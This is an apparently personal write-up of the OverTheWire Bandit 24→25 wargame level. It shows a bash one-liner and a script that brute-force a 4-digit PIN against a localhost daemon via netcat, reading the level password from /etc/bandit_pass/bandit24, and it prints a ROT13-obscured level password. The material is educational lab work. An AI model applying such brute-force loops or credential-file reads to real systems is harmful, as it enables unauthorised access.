# Write-up: Bandit 24 → 25
**Date:** 2025-08-16

## Obfuscated password (ROT13) 
`vPv86ggG4XFAr1nezXvjoDAzO3LWC3d4`

## OBJECTIVE
> "A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
>
> You do not need to create new connections each time."

## PURPOSE

We must brute-force a **4-digit PIN (0000–9999)** over **a single TCP connection** to `localhost:30002`. Each attempt is exactly one line:
```
<bandit24_password> <4-digit_pin>
```
The daemon replies **“Wrong!”** for bad guesses and prints the **bandit25** password for the correct one.  
We’ll show two solutions that both keep **one connection** open:

- a **one-liner** that streams all guesses and filters out the “Wrong!” lines (simple, quick to type);
- a tiny **script** (clear, reusable, and saves a transcript).

Using **one** connection is faster and matches the level hint; `seq -w` zero-pads the PINs (`0000…9999`) so we don’t miss leading zeros; filtering with `grep -iv '^wrong'` isolates the single success line.

First, load the current level’s password in a variable:
```bash
pass=$(cat /etc/bandit_pass/bandit24)
```

**One-liner:**
```bash
{ for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
| nc localhost 30002 | grep -iv '^wrong'
```

**Script (save, run, and keep a transcript):**
```bash
#!/usr/bin/env bash
# /tmp/brute_30002.sh — Bandit 24 → 25 over one connection

PASS="$(</etc/bandit_pass/bandit24)"
HOST=localhost
PORT=30002
OUT=/tmp/b25.out

{
  for pin in $(seq -w 0000 9999); do
    echo "$PASS $pin"
  done
} | nc "$HOST" "$PORT" | tee "$OUT"

grep -iv '^wrong' "$OUT"
```

> Note: If your `nc` is the GNU flavor and doesn’t close after stdin ends, add `-q 1` to the `nc` command.

## SOLUTIONS
- `pass=$(cat /etc/bandit_pass/bandit24)`
- **One-liner:**  
  `{ for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } | nc localhost 30002 | grep -iv '^wrong'`
- **Script approach:**  
  - Create `/tmp/brute_30002.sh` with the script above  
  - `chmod +x /tmp/brute_30002.sh`  
  - `bash /tmp/brute_30002.sh`

---

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell) • [LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
